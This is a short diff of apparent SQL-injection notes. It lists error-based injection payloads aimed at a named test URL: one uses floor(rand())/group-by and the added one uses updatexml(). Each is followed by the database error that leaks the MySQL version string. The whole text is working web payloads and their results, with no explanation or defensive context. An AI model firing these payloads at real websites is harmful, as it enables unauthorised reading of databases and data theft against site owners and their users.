@@ -2,3 +2,6 @@ http://root0x00.altervista.org/sqli/error.php
 
 ?id=1' and (select concat((version()),floor(rand (0) *2)) y from (select 1 union select 2 union select 3) y group by y having min(0)) %23
 >> Query Failed Duplicate entry '5.6.33-log1' for key 'group_key'
+
+?id=1' and updatexml(1, concat(0x2e,version()),1) -- a;
+>> Query Failed XPATH syntax error: '5.6.33-log'
